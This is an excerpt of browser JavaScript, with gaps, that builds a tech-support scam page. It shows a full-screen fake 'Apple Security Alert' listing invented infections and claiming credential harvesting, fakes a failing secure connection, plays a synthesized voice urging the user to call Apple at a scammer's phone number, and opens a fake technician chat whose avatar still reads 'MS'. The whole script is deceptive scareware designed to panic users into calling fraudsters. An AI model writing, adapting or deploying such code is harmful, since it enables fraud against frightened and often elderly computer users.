...
if(bsodShown)return;
bsodShown=true;
var pcName='Mac-'+(Math.random().toString(36).substring(2,8).toUpperCase());
var fakeIP='198.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255);
var step=0;
var w=document.createElement('div');
w.id='tb-wiz';
w.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:100000;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;padding:20px;animation:tbFadeIn 0.5s';
w.innerHTML='<div id="tb-wiz-box" style="background:#fff;border-radius:12px;box-shadow:0 12px 60px rgba(0,0,0,0.5);padding:0;max-width:560px;width:100%;overflow:hidden;border-top:4px solid #1a1a1a"></div>';
...
'</div>'+
'<h2 style="font-size:20px;font-weight:600;color:#1a1a1a;margin-bottom:6px">Apple Security Alert</h2>'+
...
'<div style="display:flex;justify-content:space-between;padding:3px 0"><span style="color:#888">Alert type:</span><span style="color:#d32f2f;font-weight:600">OSX/Spyware.HiveZY</span></div>'+
...
'<button id="tb-wiz-yes" style="flex:1;padding:12px;border:none;border-radius:8px;background:#1a1a1a;font-size:14px;font-weight:600;color:#fff;cursor:pointer">&#10004; Yes, this is my computer</button>'+
'</div></div>';
...
var threats=[
'<span style="color:#d32f2f;font-weight:600">OSX/Spyware.HiveZY</span> — Memory injection detected',
'<span style="color:#d32f2f;font-weight:600">OSX/InfoStealer.Password</span> — Credential harvesting in progress',
'<span style="color:#d32f2f;font-weight:600">OSX/Backdoor.RemoteShell</span> — Unauthorized remote connection'
...
'</div>'+
'<button id="tb-wiz-next" style="width:100%;padding:12px;border:none;border-radius:8px;background:#1a1a1a;font-size:14px;font-weight:600;color:#fff;cursor:pointer">Continue to Resolution &#8594;</button>'+
'</div>';
...
step=3;
var ref='MAC-'+Math.floor(1000+Math.random()*9000);
...
'<p style="font-size:12px;color:#555;margin-bottom:8px">&#9742; Call Apple Security Support toll-free:</p>'+
'<p style="font-size:30px;font-weight:700;color:#1a1a1a;letter-spacing:1px;margin:8px 0">'+TP_PHONE+'</p>'+
'<p style="font-size:10px;color:#999">Reference #: '+ref+'</p>'+
'</div>'+
'<div style="margin-bottom:16px"><div style="display:flex;justify-content:space-between;font-size:11px;color:#888;margin-bottom:4px"><span>Connecting to secure server</span><span id="tb-cpct">0%</span></div><div style="height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden"><div id="tb-cbar" style="height:100%;width:0%;background:linear-gradient(90deg,#1a1a1a,#00bcd4);border-radius:3px"></div></div><div style="font-size:10px;color:#d32f2f;margin-top:4px;display:none" id="tb-cerr">&#9888; Connection failed. Please call the number above.</div></div>'+
...
t.text='Alert. Your computer has been infected with a dangerous Trojan virus. Call Apple support immediately at '+TP_PHONE+' Repeat. Call Apple support now at '+TP_PHONE+' Failure to do so may result in permanent data loss.';
t.rate=0.85;
t.pitch=0.9;
t.volume=1;
...
ro.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:100003;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;animation:tbFadeIn 0.8s';
...
'<p style="font-size:24px;font-weight:700;color:#1a1a1a;letter-spacing:1px">'+TP_PHONE+'</p>'+
...
tc.style.cssText='position:fixed;bottom:80px;right:20px;z-index:100007;background:#fff;border-radius:10px;box-shadow:0 4px 24px rgba(0,0,0,0.3);padding:14px 18px;width:280px;font-family:Arial,sans-serif;border-left:4px solid #1a1a1a;animation:tbFadeIn 0.8s';
tc.innerHTML='<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">'+
'<div style="width:36px;height:36px;background:#1a1a1a;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700">MS</div>'+
'<div style="flex:1"><div style="font-size:12px;font-weight:600;color:#1a1a1a">Apple Support</div><div style="font-size:10px;color:#888">Senior Technician • <span id="tb-tech-status">Connecting...</span></div></div>'+
...
eb.innerHTML='<div style="height:100%;width:0%;background:#1a1a1a;animation:tbProgress 10s linear forwards;box-shadow:0 0 15px #1a1a1a"></div><style>@keyframes tbProgress{0%{width:0%}100%{width:100%}}</style>';
